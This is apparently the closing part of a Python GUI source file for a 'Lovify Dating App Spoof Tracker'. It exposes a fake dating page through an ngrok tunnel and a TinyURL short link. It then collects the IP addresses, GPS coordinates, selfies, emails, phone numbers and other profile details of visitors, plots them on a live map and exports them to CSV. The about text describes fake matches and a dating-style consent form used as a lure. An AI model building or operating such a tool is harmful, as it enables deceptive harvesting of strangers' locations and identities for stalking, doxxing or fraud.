            self.url_display.setText(self.tunnel.public_url)
            self.status.showMessage("Server started!", 3000)
            self.server_running = True
            self.ngrok_port = port
        except Exception as e:
            QMessageBox.critical(self, "ngrok Error", str(e))

    def handle_stop(self):
        if self.tunnel:
            try:
                ngrok.disconnect(self.tunnel.public_url)
            except Exception:
                pass
            self.tunnel = None
        self.url_display.clear()
        self.short_url_display.clear()
        self.status.showMessage("Server stopped", 2000)
        self.server_running = False

    def copy_url(self):
        url = self.url_display.text()
        if url:
            QApplication.clipboard().setText(url)
            self.status.showMessage("URL copied!", 1200)

    def shorten_url(self):
        url = self.url_display.text()
        if not url:
            self.status.showMessage("Start server first!", 1500)
            return
        try:
            resp = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=7)
            if resp.ok:
                self.short_url = resp.text
                self.short_url_display.setText(self.short_url)
                self.status.showMessage("Shortened URL ready!", 2000)
            else:
                raise Exception("TinyURL could not process the url.")
        except Exception as e:
            QMessageBox.critical(self, "Shorten Error", str(e))

    def copy_short_url(self):
        short = self.short_url_display.text()
        if short:
            QApplication.clipboard().setText(short)
            self.status.showMessage("Shortened URL copied!", 1200)

    def update_logs_and_selfies(self):
        if self.server_running:
            try:
                resp = requests.get(f"http://127.0.0.1:{self.ngrok_port}/api/logs", timeout=1)
                data = resp.json()
                self.log_display.setPlainText("\n".join(data.get("logs", [])))
                self.lat_display.setPlainText("\n".join(data.get("lat", [])))
                self.long_display.setPlainText("\n".join(data.get("long", [])))
            except Exception:
                pass
            try:
                resp = requests.get(f"http://127.0.0.1:{self.ngrok_port}/api/selfies", timeout=1)
                profiles = resp.json()
                self.update_profile_table(profiles)
                # Map plotting
                self.map_view.setHtml(MAP_HTML_TEMPLATE)
                def plot_map():
                    for p in profiles:
                        try:
                            lat = float(p.get("latitude", ""))
                            lng = float(p.get("longitude", ""))
                            name = p.get("name", "")
                            if lat and lng:
                                js = f"addPoint({lat}, {lng}, '{name}');"
                                self.map_view.page().runJavaScript(js)
                        except Exception:
                            continue
                QTimer.singleShot(800, plot_map)  # Wait for leaflet to load
            except Exception:
                pass

    def update_profile_table(self, profiles):
        self.profile_table.setRowCount(len(profiles))
        for i, p in enumerate(profiles):
            for idx, key in enumerate([
                "timestamp", "ip", "latitude", "longitude", "name", "age", "gender", "bio", "lookingfor",
                "email", "phone", "instagram", "city", "country", "job", "birthday",
                "relationship", "languages", "music", "pets"
            ]):
                self.profile_table.setItem(i, idx, QTableWidgetItem(str(p.get(key, ""))))
            fn = p.get("filename", "")
            img_path = os.path.join(SAVE_IMAGE_DIR, fn)
            if os.path.isfile(img_path):
                pixmap = QPixmap(img_path).scaled(180, 130, Qt.AspectRatioMode.KeepAspectRatio)
                label = QLabel()
                label.setPixmap(pixmap)
                label.setAlignment(Qt.AlignmentFlag.AlignCenter)
                self.profile_table.setCellWidget(i, 20, label)
            else:
                self.profile_table.setItem(i, 20, QTableWidgetItem("Not found"))

    def save_selected_selfie(self):
        row = self.profile_table.currentRow()
        if row == -1:
            QMessageBox.information(self, "No Selection", "Select a profile row first.")
            return
        fn = self.profile_table.item(row, 0).text() + "_" + self.profile_table.item(row, 1).text() + ".png"
        img_path = os.path.join(SAVE_IMAGE_DIR, fn)
        if not os.path.isfile(img_path):
            QMessageBox.warning(self, "File Not Found", f"{img_path} not found.")
            return
        dest, _ = QFileDialog.getSaveFileName(self, "Save Selfie As...", fn, "PNG Files (*.png)")
        if dest:
            with open(img_path, "rb") as fsrc, open(dest, "wb") as fdst:
                fdst.write(fsrc.read())
            QMessageBox.information(self, "Saved", f"Selfie saved to {dest}.")

    def open_settings(self):
        dlg = SettingsDialog(self, self.font_size, self.theme, self.font_family)
        if dlg.exec() == QDialog.DialogCode.Accepted:
            self.font_size, self.theme, self.font_family = dlg.get_settings()
            self.apply_theme()

    def update_fonts(self):
        font = QFont(self.font_family, self.font_size)
        for widget in self.findChildren((QLabel, QLineEdit, QTextEdit, QPushButton, QTableWidget, QStatusBar)):
            widget.setFont(font)
        self.status.setFont(QFont("Consolas", self.font_size - 2))
        self.port_input.setFont(QFont("Consolas", self.font_size))
        self.url_display.setFont(QFont("Consolas", self.font_size - 2))
        self.short_url_display.setFont(QFont("Consolas", self.font_size - 2))
        self.log_display.setFont(QFont(self.font_family, self.font_size - 2))
        self.lat_display.setFont(QFont(self.font_family, self.font_size - 2))
        self.long_display.setFont(QFont(self.font_family, self.font_size - 2))
        self.profile_table.horizontalHeader().setFont(QFont("Consolas", self.font_size - 4))

    def export_profiles(self):
        if not selfie_images:
            QMessageBox.information(self, "No Profiles", "No profiles to export.")
            return
        filename, _ = QFileDialog.getSaveFileName(self, "Export Profiles As...", PROFILE_EXPORT_FILE, "CSV Files (*.csv)")
        if not filename:
            return
        try:
            with open(filename, "w", newline='', encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow([
                    "Timestamp", "IP", "Latitude", "Longitude", "Name", "Age", "Gender", "Bio", "LookingFor",
                    "Email", "Phone", "Instagram", "City", "Country", "Job", "Birthday", "Relationship", "Languages", "Music", "Pets", "SelfieFile"
                ])
                for (ts, ip, fn, lat, lng, name, age, gender, bio, lookingfor, email, phone, instagram, city, country, job, birthday, relationship, languages, music, pets) in selfie_images:
                    writer.writerow([ts, ip, lat, lng, name, age, gender, bio, lookingfor, email, phone, instagram, city, country, job, birthday, relationship, languages, music, pets, fn])
            QMessageBox.information(self, "Exported", f"Profiles exported to:\n{filename}")
        except Exception as e:
            QMessageBox.critical(self, "Export Failed", str(e))

    def show_about(self):
        QMessageBox.information(
            self, "About",
            "Lovify Dating App Spoof Tracker\n"
            "Features: Professional dating-style consent form, logs IP/Geo/Selfie/Profile, fake matches, chatbot, live OpenStreetMap plotting, GUI customization, export, robust error handling."
        )

    def closeEvent(self, event):
        self.handle_stop()
        event.accept()

class SettingsDialog(QDialog):
    def __init__(self, parent, font_size, theme, font_family):
        super().__init__(parent)
        self.setWindowTitle("Settings")
        self.setModal(True)
        layout = QFormLayout(self)
        self.font_spin = QSpinBox()
        self.font_spin.setMinimum(10)
        self.font_spin.setMaximum(48)
        self.font_spin.setValue(font_size)
        layout.addRow("Font Size:", self.font_spin)
        self.bg_color_btn = QPushButton()
        self.bg_color_btn.setText("Pick Background")
        self.bg_color_btn.setStyleSheet(f"background:{theme['background']}")
        self.bg_color_btn.clicked.connect(self.pick_bg_color)
        self.bg_val = theme["background"]
        layout.addRow("BG Color:", self.bg_color_btn)
        self.fg_color_btn = QPushButton()
        self.fg_color_btn.setText("Pick Foreground")
        self.fg_color_btn.setStyleSheet(f"background:{theme['foreground']};color:#222;")
        self.fg_color_btn.clicked.connect(self.pick_fg_color)
        self.fg_val = theme["foreground"]
        layout.addRow("FG Color:", self.fg_color_btn)
        self.font_combo = QFontComboBox()
        self.font_combo.setCurrentFont(QFont(font_family))
        layout.addRow("Font Family:", self.font_combo)
        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(self.accept)
        btns.rejected.connect(self.reject)
        layout.addRow(btns)
    def pick_bg_color(self):
        color = QColorDialog.getColor(QColor(self.bg_val), self, "Pick Background Color")
        if color.isValid():
            self.bg_val = color.name()
            self.bg_color_btn.setStyleSheet(f"background:{self.bg_val}")
    def pick_fg_color(self):
        color = QColorDialog.getColor(QColor(self.fg_val), self, "Pick Foreground Color")
        if color.isValid():
            self.fg_val = color.name()
            self.fg_color_btn.setStyleSheet(f"background:{self.fg_val};color:#222;")
    def get_settings(self):
        return self.font_spin.value(), \
               {"background": self.bg_val, "foreground": self.fg_val,
                "button": "#ff3366", "button_text": "#fff", "button_border": "#ff3366",
                "hover": "#ffe8f0", "tab": "#fff", "tab_selected": "#ff3366",
                "tab_selected_text": "#fff", "header": "#f6f8fb"}, \
               self.font_combo.currentFont().family()

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()